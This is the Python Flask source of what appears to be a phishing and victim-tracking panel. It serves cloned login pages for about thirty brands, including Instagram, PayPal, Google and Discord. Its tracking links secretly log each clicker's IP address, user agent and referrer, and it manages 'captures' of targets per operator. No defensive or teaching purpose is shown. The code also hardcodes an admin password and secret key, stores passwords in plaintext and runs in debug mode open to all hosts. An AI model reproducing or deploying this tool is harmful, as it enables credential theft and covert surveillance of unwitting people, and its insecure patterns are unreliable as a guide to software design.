from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_file
import json
import os
import datetime
import uuid

app = Flask(__name__)
app.secret_key = 'shadow_secret_key_2026_ultra_secure'

# Load config
with open('config.json', 'r') as f:
    CONFIG = json.load(f)

# Data storage
DATA_FILE = 'data.json'

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"users": [], "links": [], "captures": [], "logs": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)

# ==================== LOADING SCREEN ====================
@app.route('/')
def loading():
    return render_template('loading.html', config=CONFIG)

# ==================== AUTH PAGES ====================
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        data = load_data()

        for user in data["users"]:
            if user["username"] == username and user["password"] == password:
                session['user'] = username
                return redirect(url_for('dashboard'))

        # Admin login
        if username == "admin" and password == "shadowadmin749926n":
            session['admin'] = True
            return redirect(url_for('dashboard'))

        return render_template('login.html', config=CONFIG, error="Invalid credentials!")
    return render_template('login.html', config=CONFIG, error=None)

@app.route('/signup', methods=['GET', 'POST'])
def signup():
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        email = request.form.get('email', '')

        data = load_data()

        # Check if user exists
        for user in data["users"]:
            if user["username"] == username:
                return render_template('signup.html', config=CONFIG, error="Username already taken!")

        new_user = {
            "id": str(uuid.uuid4())[:8],
            "username": username,
            "password": password,
            "email": email,
            "created_at": datetime.datetime.now().isoformat(),
            "role": "user"
        }
        data["users"].append(new_user)
        save_data(data)

        session['user'] = username
        return redirect(url_for('dashboard'))

    return render_template('signup.html', config=CONFIG, error=None)

# ==================== MAIN DASHBOARD ====================
@app.route('/dashboard')
def dashboard():
    if not session.get('user') and not session.get('admin'):
        return redirect(url_for('login'))

    data = load_data()
    current_user = session.get('user') or "admin"

    # Filter data for regular users
    if not session.get('admin'):
        user_links = [l for l in data["links"] if l.get("created_by") == current_user]
        user_captures = [c for c in data["captures"] if c.get("created_by") == current_user]
    else:
        user_links = data["links"]
        user_captures = data["captures"]

    return render_template('dashboard.html', config=CONFIG, data=data, 
                          user_links=user_links, user_captures=user_captures,
                          is_admin=session.get('admin', False),
                          current_user=current_user)

# ==================== LINK TRACKING ====================
@app.route('/api/track', methods=['POST'])
def track_link():
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401

    url = request.json.get('url', '')
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    track_id = str(uuid.uuid4())[:8]
    data = load_data()

    track_data = {
        "id": track_id,
        "url": url,
        "created_at": datetime.datetime.now().isoformat(),
        "created_by": session.get('user') or "admin",
        "clicks": 0,
        "visitors": []
    }
    data["links"].append(track_data)
    save_data(data)

    track_url = request.host_url + 't/' + track_id
    return jsonify({"success": True, "track_id": track_id, "track_url": track_url})

@app.route('/t/<track_id>')
def redirect_track(track_id):
    data = load_data()
    for link in data["links"]:
        if link["id"] == track_id:
            link["clicks"] += 1
            visitor = {
                "ip": request.remote_addr,
                "user_agent": request.headers.get('User-Agent', ''),
                "time": datetime.datetime.now().isoformat(),
                "referrer": request.headers.get('Referer', 'Direct')
            }
            link["visitors"].append(visitor)
            save_data(data)
            return redirect(link["url"])
    return "Link not found", 404

# ==================== CAPTURE SYSTEM ====================
@app.route('/api/capture', methods=['POST'])
def capture_data():
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401

    target = request.json.get('target', '')
    capture_type = request.json.get('type', 'screenshot')
    capture_id = str(uuid.uuid4())[:8]

    data = load_data()
    capture = {
        "id": capture_id,
        "target": target,
        "type": capture_type,
        "status": "Active",
        "created_at": datetime.datetime.now().isoformat(),
        "created_by": session.get('user') or "admin",
        "result": None,
        "logs": []
    }
    data["captures"].append(capture)
    save_data(data)

    return jsonify({"success": True, "capture_id": capture_id})

# ==================== TEMPLATES ====================
@app.route('/template/<name>')
def template_page(name):
    templates = [
        "netflix", "instagram", "facebook", "google", "tiktok", "pubg",
        "whatsapp", "snapchat", "twitter", "youtube", "spotify", "discord",
        "steam", "epicgames", "roblox", "minecraft", "fortnite", "callofduty",
        "freefire", "amongus", "paypal", "amazon", "flipkart", "daraz",
        "zoom", "telegram", "signal", "linkedin", "github"
    ]
    if name not in templates:
        return "Template not found", 404
    return render_template(f'templates/{name}.html', config=CONFIG)

# ==================== API ENDPOINTS ====================
@app.route('/api/stats')
def api_stats():
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    data = load_data()
    return jsonify({
        "total_users": len(data["users"]),
        "total_links": len(data["links"]),
        "total_clicks": sum(l["clicks"] for l in data["links"]),
        "total_captures": len(data["captures"]),
        "total_visitors": sum(len(l["visitors"]) for l in data["links"])
    })

@app.route('/api/links')
def api_links():
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    data = load_data()
    if session.get('admin'):
        return jsonify(data["links"])
    user_links = [l for l in data["links"] if l.get("created_by") == session.get('user')]
    return jsonify(user_links)

@app.route('/api/captures')
def api_captures():
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    data = load_data()
    if session.get('admin'):
        return jsonify(data["captures"])
    user_captures = [c for c in data["captures"] if c.get("created_by") == session.get('user')]
    return jsonify(user_captures)

@app.route('/api/delete_link/<link_id>', methods=['DELETE'])
def delete_link(link_id):
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    data = load_data()
    data["links"] = [l for l in data["links"] if l["id"] != link_id]
    save_data(data)
    return jsonify({"success": True})

@app.route('/api/delete_capture/<cap_id>', methods=['DELETE'])
def delete_capture(cap_id):
    if not session.get('user') and not session.get('admin'):
        return jsonify({"error": "Unauthorized"}), 401
    data = load_data()
    data["captures"] = [c for c in data["captures"] if c["id"] != cap_id]
    save_data(data)
    return jsonify({"success": True})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('loading'))

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
